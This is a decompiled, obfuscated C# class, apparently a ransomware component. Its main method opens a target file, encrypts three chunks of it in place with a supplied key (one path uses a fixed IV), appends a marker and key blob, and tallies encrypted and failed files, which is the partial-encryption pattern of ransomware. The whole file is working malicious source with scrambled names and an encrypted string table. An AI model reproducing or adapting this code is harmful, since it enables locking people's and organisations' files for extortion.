using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using XDfkvgdjgIic;

namespace drXPuaQNZPOSPCS;

internal sealed class zQrrdfdyTPbGA
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int MakedWOocSQFXp(long long_0)
	{
		return (int)long_0;
	}

	public static bool opNZPDFPzEYow(string PigSWYBjmiqkA, string AmYKduShNTpxJy, string pexcVZEHayaR, byte[] swXYLDhwtFbajnh = null, byte[] sITdhhwhyLjc = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(PigSWYBjmiqkA, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = MakedWOocSQFXp(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(AmYKduShNTpxJy) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(AmYKduShNTpxJy) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(AmYKduShNTpxJy) * 1024 * 1024) / 10;
				}
				int mQoKRHZlLpPJ = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = rZZdsbppzkHGBx(PigSWYBjmiqkA, fileStream, mQoKRHZlLpPJ, num * i);
					array = (OBRXLDkWsVk.pfmrZzuzgFVdg ? ZJPCkUensbMQ.azaPAsjkpkAz(byte_, Convert.FromBase64String(pexcVZEHayaR), sITdhhwhyLjc) : qsVBtPrJSv.KiYWDoMxnom(byte_, Convert.FromBase64String(pexcVZEHayaR), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					bIBmZydCLIoOsJTm(PigSWYBjmiqkA, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (OBRXLDkWsVk.yzxmjEHglZqnOW ? Encoding.ASCII.GetBytes(OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107399643)) + OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107400729)) + Convert.ToString(AmYKduShNTpxJy) + OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107400729))) : Encoding.ASCII.GetBytes(OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107399643)) + OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107400770)) + Convert.ToString(AmYKduShNTpxJy) + OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107400770))));
			if (!OBRXLDkWsVk.yzxmjEHglZqnOW)
			{
				using FileStream fileStream2 = new FileStream(PigSWYBjmiqkA, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(PigSWYBjmiqkA, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(swXYLDhwtFbajnh, 0, swXYLDhwtFbajnh.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (OBRXLDkWsVk.ZQkgwClpBNRNGiD)
			{
				try
				{
					File.AppendAllText(OBRXLDkWsVk.LtQdcjdFVaR, getString_0(107387563) + PigSWYBjmiqkA + getString_0(107399662) + ex.Message + getString_0(107396668));
				}
				catch (Exception)
				{
				}
			}
			OBRXLDkWsVk.hRbHTMLNoeoN++;
			return false;
		}
		OBRXLDkWsVk.bTxbPbZzsh++;
		return true;
	}

	public static byte[] rZZdsbppzkHGBx(string CpkexLevbXa, FileStream lHfXROaaGaSDr, int mQoKRHZlLpPJ, int MTAnpjvmvhknpkyd = 0)
	{
		byte[] array = new byte[mQoKRHZlLpPJ];
		lHfXROaaGaSDr.Position = MTAnpjvmvhknpkyd;
		lHfXROaaGaSDr.Read(array, 0, mQoKRHZlLpPJ);
		return array;
	}

	public static void bIBmZydCLIoOsJTm(string PkuFUUkbavUEN, FileStream eFaLbKGAvhDgT, byte[] EcZaevvxLQSP, int OWmnltFIpIYclq = 0)
	{
		eFaLbKGAvhDgT.Position = OWmnltFIpIYclq;
		eFaLbKGAvhDgT.Write(EcZaevvxLQSP, 0, EcZaevvxLQSP.Length);
	}

	static zQrrdfdyTPbGA()
	{
		Strings.CreateGetStringDelegate(typeof(zQrrdfdyTPbGA));
	}
}
